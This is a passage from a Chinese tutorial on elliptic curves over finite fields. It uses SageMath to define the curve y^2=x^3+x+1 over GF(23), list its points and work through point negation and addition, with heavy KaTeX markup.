</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">λ</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.73333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.625em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal">λ</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.7777700000000001em;vertical-align:-0.19444em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord">−</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">&gt;</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.8777699999999999em;vertical-align:-0.19444em;"></span><span class="mord mathnormal">Q</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p>
<p>Sage 建立一个椭圆曲线</p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre><span class="token function">show</span><span class="token punctuation">(</span>E<span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>E<span class="token punctuation">.</span><span class="token function">plot</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><img data-src="https://s3.bmp.ovh/imgs/2022/03/3382d4f0cb2448c0.png" alt="" title="在有限域上椭圆曲线变成离散的点" /></p>
<p>枚举该曲线上所有的点</p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="2"></td><td><pre>E<span class="token punctuation">.</span><span class="token function">points</span><span class="token punctuation">(</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre>#<span class="token punctuation">[</span><span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">0</span> <span class="token operator">:</span> <span class="token number">22</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">7</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1</span> <span class="token operator">:</span> <span class="token number">16</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">:</span> <span class="token number">10</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">3</span> <span class="token operator">:</span> <span class="token number">13</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">4</span> <span class="token operator">:</span> <span class="token number">0</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">:</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">5</span> <span class="token operator">:</span> <span class="token number">19</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">:</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">6</span> <span class="token operator">:</span> <span class="token number">19</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">:</span> <span class="token number">11</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">7</span> <span class="token operator">:</span> <span class="token number">12</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">:</span> <span class="token number">7</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">9</span> <span class="token operator">:</span> <span class="token number">16</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">11</span> <span class="token operator">:</span> <span class="token number">3</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">11</span> <span class="token operator">:</span> <span class="token number">20</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">12</span> <span class="token operator">:</span> <span class="token number">4</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">12</span> <span class="token operator">:</span> <span class="token number">19</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">13</span> <span class="token operator">:</span> <span class="token number">7</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">13</span> <span class="token operator">:</span> <span class="token number">16</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">17</span> <span class="token operator">:</span> <span class="token number">3</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">17</span> <span class="token operator">:</span> <span class="token number">20</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">18</span> <span class="token operator">:</span> <span class="token number">3</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">18</span> <span class="token operator">:</span> <span class="token number">20</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">19</span> <span class="token operator">:</span> <span class="token number">5</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">19</span> <span class="token operator">:</span> <span class="token number">18</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">]</span></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>有限域</mtext><msub><mi>F</mi><mn>23</mn></msub><mtext>上的椭圆曲线的点集</mtext><mi>F</mi><mtext>：</mtext><msup><mi>y</mi><mn>2</mn></msup><mo>=</mo><msup><mi>x</mi><mn>3</mn></msup><mo>+</mo><mi>x</mi><mo>+</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">有限域F_{23}上的椭圆曲线的点集F：y^2=x^3+x+1
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.0585479999999998em;vertical-align:-0.19444em;"></span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.13889em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">椭</span><span class="mord cjk_fallback">圆</span><span class="mord cjk_fallback">曲</span><span class="mord cjk_fallback">线</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">集</span><span class="mord mathnormal" style="margin-right:0.13889em;">F</span><span class="mord cjk_fallback">：</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">y</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.9474379999999999em;vertical-align:-0.08333em;"></span><span class="mord"><span class="mord mathnormal">x</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">x</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span></span></p>
<table>
<thead>
<tr>
<th style="text-align:center"><strong>0，1</strong></th>
<th style="text-align:center"><strong>0，22</strong></th>
<th style="text-align:center"><strong>1，7</strong></th>
<th style="text-align:center"><strong>1，16</strong></th>
<th style="text-align:center"><strong>3，10</strong></th>
<th style="text-align:center"><strong>3，13</strong></th>
<th style="text-align:center"><strong>4，0</strong></th>
<th style="text-align:center"><strong>5，4</strong></th>
<th style="text-align:center"><strong>5，19</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><strong>6，4</strong></td>
<td style="text-align:center"><strong>6，19</strong></td>
<td style="text-align:center"><strong>7，11</strong></td>
<td style="text-align:center"><strong>7，12</strong></td>
<td style="text-align:center"><strong>9，7</strong></td>
<td style="text-align:center"><strong>9，16</strong></td>
<td style="text-align:center"><strong>11，3</strong></td>
<td style="text-align:center"><strong>11，20</strong></td>
<td style="text-align:center"><strong>12，4</strong></td>
</tr>
<tr>
<td style="text-align:center"><strong>12，19</strong></td>
<td style="text-align:center"><strong>13，7</strong></td>
<td style="text-align:center"><strong>13，16</strong></td>
<td style="text-align:center"><strong>17，3</strong></td>
<td style="text-align:center"><strong>17，20</strong></td>
<td style="text-align:center"><strong>18，3</strong></td>
<td style="text-align:center"><strong>18，20</strong></td>
<td style="text-align:center"><strong>19，5</strong></td>
<td style="text-align:center"><strong>19，18</strong></td>
</tr>
</tbody>
</table>
<p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>由</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>的产生方式知道，</mtext><mo>−</mo><mi>P</mi><mtext>也是</mtext><msub><mi>E</mi><mi>p</mi></msub><mo stretchy="false">(</mo><mi>a</mi><mo separator="true">,</mo><mi>b</mi><mo stretchy="false">)</mo><mtext>上的一个点；令</mtext><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo>∈</mo><msub><mi>E</mi><mn>23</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mo>−</mo><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mo>−</mo><mn>7</mn><mo stretchy="false">)</mo><mtext>且由有限域知，</mtext><mo>−</mo><mn>7</mn><mi>m</mi><mi>o</mi><mi>d</mi><mn>23</mn><mo>≡</mo><mn>16</mn><mo separator="true">,</mo><mspace width="1em"/><mo>∴</mo><mo>−</mo><mi>P</mi><mo>=</mo><mo stretchy="false">(</mo><mn>13</mn><mo separator="true">,</mo><mn>16</mn><mo stretchy="false">)</mo><mtext>存在与该表中</mtext></mrow><annotation encoding="application/x-tex">由E_p(a,b)的产生方式知道，-P也是E_p(a,b)上的一个点；令P=(13,7)\in E_{23}(1,1),-P=(13,-7)且由有限域知，-7mod23 \equiv16,\quad \therefore-P=(13,16)存在与该表中
</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord cjk_fallback">由</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">产</span><span class="mord cjk_fallback">生</span><span class="mord cjk_fallback">方</span><span class="mord cjk_fallback">式</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">道</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.036108em;vertical-align:-0.286108em;"></span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mord cjk_fallback">也</span><span class="mord cjk_fallback">是</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.15139200000000003em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">p</span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.286108em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord mathnormal">a</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">b</span><span class="mclose">)</span><span class="mord cjk_fallback">上</span><span class="mord cjk_fallback">的</span><span class="mord cjk_fallback">一</span><span class="mord cjk_fallback">个</span><span class="mord cjk_fallback">点</span><span class="mord cjk_fallback">；</span><span class="mord cjk_fallback">令</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">7</span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">∈</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.05764em;">E</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.05764em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">3</span></span></span></span></span><span class="vlist-s">​</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mopen">(</span><span class="mord">1</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">−</span><span class="mord">7</span><span class="mclose">)</span><span class="mord cjk_fallback">且</span><span class="mord cjk_fallback">由</span><span class="mord cjk_fallback">有</span><span class="mord cjk_fallback">限</span><span class="mord cjk_fallback">域</span><span class="mord cjk_fallback">知</span><span class="mord cjk_fallback">，</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">−</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.69444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mord">2</span><span class="mord">3</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">≡</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.8866799999999999em;vertical-align:-0.19444em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mpunct">,</span><span class="mspace" style="margin-right:1em;"></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel amsrm">∴</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.76666em;vertical-align:-0.08333em;"></span><span class="mord">−</span><span class="mord mathnormal" style="margin-right:0.13889em;">P</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mopen">(</span><span class="mord">1</span><span class="mord">3</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord">1</span><span class="mord">6</span><span class="mclose">)</span><span class="mord cjk_fallback">存</span><span class="mord cjk_fallback">在</span><span class="mord cjk_fallback">与</span><span class="mord cjk_fallback">该</span><span class="mord cjk_fallback">表</span><span class="mord cjk_fallback">中</span></span></span></span></span></p>
<figure class="highlight matlab"><figcaption data-lang="MATLAB"></figcaption><table><tr><td data-num="1"></td><td><pre>#有限域椭圆曲线上进行加法</pre></td></tr><tr><td data-num="2"></td><td><pre>E <span class="token operator">=</span> <span class="token function">EllipticCurve</span><span class="token punctuation">(</span><span class="token function">GF</span><span class="token punctuation">(</span><span class="token number">23</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="3"></td><td><pre><span class="token function">print</span><span class="token punctuation">(</span><span class="token function">E</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">22</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token function">E</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span></pre></td></tr><tr><td data-num="4"></td><td><pre>#<span class="token punctuation">(</span><span class="token number">17</span> <span class="token operator">:</span> <span class="token number">3</span> <span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">)</span></pre></td></tr></table></figure><p><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><mtext>以</mtext><msub><mi>E</mi><mn>23</mn></msub><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>1</mn><mo stretchy="false">)</mo><mtext>为例，</mtext><mi>P</mi><mo stretchy="false">(</mo><mn>0</mn><mo separator="true">,</mo><mn>22</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mi>Q</mi><mo stretchy="false">(</mo><mn>1</mn><mo separator="true">,</mo><mn>7</mn><mo stretchy="false">)</mo><mo separator="true">,</mo><mtext>则</mtext><mi>P</mi><mo>+</mo><mi>Q</mi><mo>=</mo><mo stretchy="false">?</mo></mrow><annotation encoding="application/x-tex">以E_{23}(1,1)为例，P(0,22),Q(1,7),则P+Q=?
